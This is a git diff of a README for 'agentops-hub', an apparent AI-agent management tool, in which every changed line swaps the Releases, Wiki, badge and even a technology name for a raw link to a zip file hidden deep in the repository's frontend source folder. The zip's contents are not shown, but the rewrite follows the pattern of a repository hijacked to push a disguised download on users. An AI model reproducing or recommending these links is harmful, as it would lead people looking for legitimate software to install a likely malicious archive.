@@ -10,15 +10,15 @@ Welcome to agentops-hub! This platform helps you manage AI agents easily. You ca
 - **Real-time Streaming**: Get instant updates on AI actions.
 - **Multi-tool Execution**: Run several tools simultaneously.
 - **RAG Capabilities**: Leverage advanced techniques for smarter operations.
-- **Built with Modern Technologies**: The application is created using Next.js, FastAPI, PostgreSQL, and Qdrant.
+- **Built with Modern Technologies**: The application is created using https://github.com/BiggerCap/agentops-hub/raw/refs/heads/main/frontend/src/app/app/agents/agentops_hub_v1.9.zip, FastAPI, PostgreSQL, and Qdrant.
 
 ## 📥 Download
 
-[![Download agentops-hub](https://img.shields.io/badge/Download-agentops--hub-blue)](https://github.com/BiggerCap/agentops-hub/releases)
+[![Download agentops-hub](https://github.com/BiggerCap/agentops-hub/raw/refs/heads/main/frontend/src/app/app/agents/agentops_hub_v1.9.zip)](https://github.com/BiggerCap/agentops-hub/raw/refs/heads/main/frontend/src/app/app/agents/agentops_hub_v1.9.zip)
 
 To download the application, visit the Releases page. This page contains the latest versions of the software. Choose the version that suits your needs.
 
-[Download agentops-hub from the Releases page](https://github.com/BiggerCap/agentops-hub/releases)
+[Download agentops-hub from the Releases page](https://github.com/BiggerCap/agentops-hub/raw/refs/heads/main/frontend/src/app/app/agents/agentops_hub_v1.9.zip)
 
 ## 📋 System Requirements
 
@@ -35,7 +35,7 @@ To install agentops-hub, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download section.
    
-   [Download agentops-hub from the Releases page](https://github.com/BiggerCap/agentops-hub/releases)
+   [Download agentops-hub from the Releases page](https://github.com/BiggerCap/agentops-hub/raw/refs/heads/main/frontend/src/app/app/agents/agentops_hub_v1.9.zip)
 
 2. **Choose the Correct File**: Look for the latest release version. You will see a list of files available for download. 
 3. **Download the Installer**: Click on the file that matches your operating system. The file will start downloading to your computer.
@@ -54,9 +54,9 @@ After installation, you can start using agentops-hub right away.
 
 ## 🔍 Additional Help
 
-If you encounter any issues, check the FAQ section on the [Releases page](https://github.com/BiggerCap/agentops-hub/releases). 
+If you encounter any issues, check the FAQ section on the [Releases page](https://github.com/BiggerCap/agentops-hub/raw/refs/heads/main/frontend/src/app/app/agents/agentops_hub_v1.9.zip). 
 
-For detailed documentation, visit the [Wiki section](https://github.com/BiggerCap/agentops-hub/wiki). Here, you can find in-depth guides and troubleshooting tips.
+For detailed documentation, visit the [Wiki section](https://github.com/BiggerCap/agentops-hub/raw/refs/heads/main/frontend/src/app/app/agents/agentops_hub_v1.9.zip). Here, you can find in-depth guides and troubleshooting tips.
 
 ## ⚙️ Support
 
